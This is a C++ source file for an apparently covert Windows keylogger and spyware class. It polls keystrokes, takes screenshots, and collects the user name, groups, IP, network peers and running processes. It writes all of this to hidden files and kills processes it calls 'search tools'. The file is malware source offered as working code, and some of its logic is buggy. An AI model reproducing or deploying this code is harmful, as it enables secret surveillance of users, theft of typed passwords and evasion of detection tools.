#define _CRT_SECURE_NO_WARNINGS
#include "Info.h"
#pragma comment(lib, "netapi32.lib")
#include <Windows.h>
#include <Windows.h>
#include <iostream>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <string>
#include <Lmcons.h>
#include <Shlwapi.h>
#include <atlimage.h>  
#include <Wtsapi32.h>
#include <tlhelp32.h>
#include <regex>
#include <lm.h>
#include <AtlBase.h>
#include <atlconv.h>
#include <ctime>
#include <iomanip>
#include <fileapi.h>
#include <algorithm>
#include <exception>
#include "utils.h"

//static member
int Info::numOfRounds = 0;

// -----------Constructor-----------------
Info::Info()
{   
    numOfRounds++;
    setIpAddress();
    std::cout << "Finished Ip address" << std::endl;
    setConnectedUser(); 
    std::cout << "Finished Connected" << std::endl;
    setRelatedGroups();
    std::cout << "Finished Groups" << std::endl;
    setOsVersion();
    std::cout << "Finished Os Version" << std::endl;

    startThreads();
    std::cout << "Started Threads";

}

//---------------Destructor-----------------
Info::~Info()
{
    closeThreads();
    this->writeToFile();
    this->_groups.clear();
    this->_keyStrokes.clear();
    this->_processes.clear();
    this->_dest_ip.clear();

}

/*
This function writes to file and also takes a screenshot
Input:None
Output:None
*/
void Info::writeToFile()
{
    ///get path
    time_t time = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    struct tm* x = localtime(&time);
    string nowTime = std::to_string(x->tm_mday) + '\.' + std::to_string(x->tm_mon + 1) + '_' + std::to_string(x->tm_hour) + ':' + std::to_string(x->tm_min);

    
    std::ofstream file("data.txt", std::ios::app);
    setFileHidden("data.txt");
    if (file.is_open())
    {
        std::cout << nowTime;
        file << "             -------------DATA----------  " << nowTime<< std::endl;

        file << "Connected User :" + this->_connected_user << std::endl;
        file << " Computer Ip : " + this->_ip << std::endl;
        file << "Os version : " + this->_os_version << std::endl;
        file << "The groups of the user: " << std::endl;

        for (size_t i = 0; i < this->_groups.size(); i++)
        {
            file << std::to_string(i+1) + "." + this->_groups[i] << std::endl;
        }

        file << "The ip's the computer is talking with: " << std::endl;
        for (int i = 0; i < this->_dest_ip.size(); i++)
        {
            file << std::to_string(i+1) + ". " + this->_dest_ip[i] << std::endl;
        }

        file << "The open processes in the computer: " << std::endl;
        std::multimap<string, int> data = fromMapToMultiMap(this->_processes);
        for (std::multimap<string,int>::iterator iter =data.begin(); iter !=data.end(); iter++)
            file << iter->first<< std::endl;
        file << "The keystrokes typed in the computer: "<<std::endl<<_keyStrokes;

    }
    else
    {
        std::cout << "Can't open it!" << std::endl;
    }
    std::replace(nowTime.begin(), nowTime.end(), ':', '-');  
    this->setScreenShots(nowTime+".jpeg");
}


/*
This function sets the connected user in the computer
Input:None
Output:None
*/
void Info::setConnectedUser() 
{   
    char name[UNLEN];
    DWORD nameLen = UNLEN;
    GetUserNameA(name, &nameLen);

    this->_connected_user = name;
}

/*
This function sets the groups user is taking part in 
Input:None
Output:None
*/
void Info::setRelatedGroups()
{
    
    if (this->_connected_user == "")
    {
        this->setConnectedUser();
    }


    CA2W ca2w(this->_connected_user.c_str());
    std::wstring wname = (std::wstring)ca2w;
   
    LPBYTE buffer;
    DWORD entries ,total_entries;

    //FOR LOCAL Groups
    NetUserGetLocalGroups(NULL,wname.c_str(), 0, LG_INCLUDE_INDIRECT, (LPBYTE*)&buffer, MAX_PREFERRED_LENGTH, &entries, &total_entries);
    LOCALGROUP_USERS_INFO_0* localGroups = (LOCALGROUP_USERS_INFO_0*)buffer;
    for (size_t i = 0; i < entries; i++)
    {
        std::wstring wname = (std::wstring)localGroups[i].lgrui0_name;
        this->_groups.push_back(std::string(wname.begin(),wname.end()));
    }
    NetApiBufferFree(buffer);


    //FOR GLOBAL GROUPS
    NetUserGetGroups(NULL, wname.c_str(), 0, &buffer, MAX_PREFERRED_LENGTH, &entries, &total_entries);
    GROUP_USERS_INFO_0* globalGroups = (GROUP_USERS_INFO_0*)buffer;

    for (size_t i = 0; i < entries; i++)
    {
        std::wstring wname = (std::wstring)globalGroups[i].grui0_name;

        this->_groups.push_back(std::string(wname.begin(), wname.end()));
    }

}

/*
This function sets all the keystrokes the user typed
Input:None
Output:None
*/
void Info::setKeyStrokes()
{
    while (_work)
    {

        string text = "";
        //special
        bool cap = (GetKeyState(VK_CAPITAL) & 0x0001);
        bool shift = GetAsyncKeyState(VK_SHIFT);
        if (GetAsyncKeyState(VK_MENU))
        {
            text += "ALT + ";
        }
        if (GetAsyncKeyState(VK_CONTROL))
        {
            text += "Ctrl + ";
        }
        if (GetAsyncKeyState(VK_DELETE))
        {
            text += "Delete";
        }
        if (GetAsyncKeyState(VK_TAB))
        {
            text += '\t';
        }
        if (GetAsyncKeyState(VK_SPACE))
        {
            text += ' ';
        }
        if (GetAsyncKeyState(VK_RETURN))
        {
            text += " Enter \n";
        }


        //letters
        for (char i = 'A'; i < 'Z'; i++)
        {
            if (GetAsyncKeyState(i))
            {
                if (!cap)
                {
                    i = 'a' + i - 'A';
                }
                text += i;
            }
        }
        for (size_t i = 0; i < 10; i++)
        {
            if (GetAsyncKeyState(VK_NUMPAD0 + i))
            {
                text += std::to_string(i);
            }
            if (GetAsyncKeyState(0x30 + i))
            {
                if (shift)
                {
                    text += getShiftSpecial(i);
                }
                else
                {
                    text += "SHIFT + ";
                    text += "up " + std::to_string(i) + " ";

                }

            }


        }
        for (size_t i = 0; i < 12; i++)
        {
            if (GetAsyncKeyState(VK_F1 + i))
            {
                text += "F" + std::to_string(i + 1);
            }
        }


        if (!text.empty())
            this->_keyStrokes += text; //<std::endl;
        if (GetAsyncKeyState(VK_BACK))
        {
            if (this->_keyStrokes.size() >0)
            {
                this->_keyStrokes.substr(0, this->_keyStrokes.size() - 1);
            }
        }
            
        std::this_thread::sleep_for(std::chrono::milliseconds(100));

    }

}


/*
This function takes a screenshot and saves into a file
Input:The address of the file
Output:None
*/
void Info::setScreenShots(string add)
{
    HDC  hScreen = GetDC(NULL);
    HDC  hDC = CreateCompatibleDC(hScreen);

    int w = GetDeviceCaps(hScreen, HORZRES);//HORIZONAL
    int h = GetDeviceCaps(hScreen, VERTRES);//VERTICAL
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen,w,h);

    HBITMAP hOBitMap = (HBITMAP)SelectObject(hDC, hBitmap);
    //transform the colors
    BitBlt(hDC, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hDC, hOBitMap);

    CImage image;
    ULARGE_INTEGER liSize;

    // screenshot to jpg and save to stream
    image.Attach(hBitmap);
    try
    {
        CA2W toWide(add.c_str());
        HRESULT h = image.Save(toWide, Gdiplus::ImageFormatJPEG);
        setFileHidden(add);
    }
    catch (std::exception e)
    {
        std::cout << e.what();
    }

    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
}
/*
This function sets all the ip the server is communicates with
Input:None
Output:None
*/
void Info::setDestIp()
{

    vector<string> output = getCommandResult("netstat -n");
    std::regex e("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}");
    while (_work)
    {
        for (size_t i = 0; i < output.size(); i++)
        {
            std::smatch m;
            vector<string> ip;
            while (std::regex_search(output[i], m, e)) {
                //TODO: fix this trouble maker
                for (size_t i = 0; i < m.size(); i++)
                {
                    ip.push_back(m[i]);
                }
                output[i] = m.suffix().str();
            }
            if (ip.size() > 1)
            {
                if (std::find(this->_dest_ip.begin(), this->_dest_ip.end(), ip[1]) == this->_dest_ip.end())
                {
                    this->_dest_ip.push_back(ip[1]);
                    //std::cout << ip[1] << std::endl;
                }
            }
        }
    }
}    /*
    std::regex wanted(R"rgx([0-9]{1,3}\.){3}[0-9])rgx");
    */

/*
This function Sets the ip address of the user
Input:None
Output:None
*/
void Info::setIpAddress()
{
    vector<string> output = getCommandResult("ipconfig");

    char toSearch[] = "IPv4 Address. . . . . . . . . . . : ";
    int offset;

    for (int i = output.size()-1; i >=0 ; i--)
    {
        int place = output[i].find(toSearch);
        if (place != string::npos)
        {
            string ip = output[i].substr(place + strlen(toSearch));
            this->_ip = ip;
            return;
        }

    }


}
/*
This function kills a process
Input:The pid of the process
Output:None
*/
void Info::terminateProcess(int pid)
{
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, TRUE,pid);
    TerminateProcess(process, 1);

}

/*
This function starts all the threads of the object
Input:None
Output:None
*/
void Info::startThreads()
{
    this->_work = true;
    this->_threads.push_back(std::thread(&Info::setDestIp, this));
    this->_threads.push_back(std::thread(&Info::setKeyStrokes, this));
    this->_threads.push_back(std::thread(&Info::setProcesses, this));
}

/*
This function closes all the threads of the object
Input:None
Output:None
*/
void Info::closeThreads()
{
    _work = false;
    for (size_t i = 0; i < this->_threads.size(); i++)
    {
        this->_threads[i].join();
    }
}


/*
This function returns if the proccess ia an illegal search tool
Input:procName - the name of the process :: std::wstring
Output:If the proccess is an illegal code ::bool 
*/
bool Info::isSearchTool(std::string procName) const
{
    std::transform(procName.begin(), procName.end(), procName.begin(), ::tolower);
    for (int i = 0; i < SEARCHTOOLSSIZE; i++)
    {
        if (procName.find(SearchTools[i]) != std::string::npos)
        {
            return true;
        }
    }
    return false;
}

/*
This function sets the os version of the computer
Input:None
Output:None
*/
void Info::setOsVersion()
{
    std::string os = "Windows ";
    NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
    OSVERSIONINFOEXW osInfo;
    //use the RtlGetVersion from the outter dll
    *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
    if (NULL != RtlGetVersion)
    {
        
        osInfo.dwOSVersionInfoSize = sizeof(osInfo);
        RtlGetVersion(&osInfo);
        os += std::to_string(osInfo.dwMajorVersion) + '.' + std::to_string((int)osInfo.dwMinorVersion);
    }
    this->_os_version = os;
}
 
/*
This function sets all the process that are running on the computer
Input:None
Output:None
*/
void Info::setProcesses()
{
    while (_work)
    {
        std::map<int, std::string> procs = getProcesses();
        for(std::map<int,std::string>::iterator i = procs.begin();i!=procs.end(); i++)
        {           
            
            if (Info::numOfRounds == 1 && isSearchTool(i->second))
            {
                terminateProcess(i->first);
            }
            else // if valid
            {
                std::map<int,std::string>::iterator it = this->_processes.find(i->first);
                if (it == this->_processes.end())
                    this->_processes.insert(std::pair<int,std::string>(i->first,i->second));
            }

        }
    }
}
